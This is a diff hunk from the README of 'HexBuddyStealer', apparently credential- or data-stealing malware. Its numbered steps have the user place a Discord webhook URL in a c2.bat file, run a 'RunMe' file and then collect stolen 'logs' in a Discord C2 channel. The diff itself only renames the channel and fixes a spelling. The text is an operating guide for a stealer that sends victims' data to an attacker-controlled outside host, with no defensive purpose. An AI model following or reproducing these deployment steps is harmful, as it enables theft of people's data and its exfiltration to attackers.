@@ -27,7 +27,7 @@ Then Name it !
 4. Go To /Bin/c2.bat file in the Downloaded Folder in HexBuddyStealer and open in Notepad
 5. Edit The "set "Webtoken=https://discord.com/api/webhooks/your_webhook_here" "
 6. Run The "RunMe.Ink" and wait for 13 seconds
-7. Then Look At The General Channel On Discord .... You will Already Recieve Notifactions In The Channel 
+7. Then Look At The C2 Channel On Discord .... You will Already Recieve Notifications In The Channel 
 8. Enjoy The Logs <3
 
 Check Out My Git Book For More Cool Resourses !! 
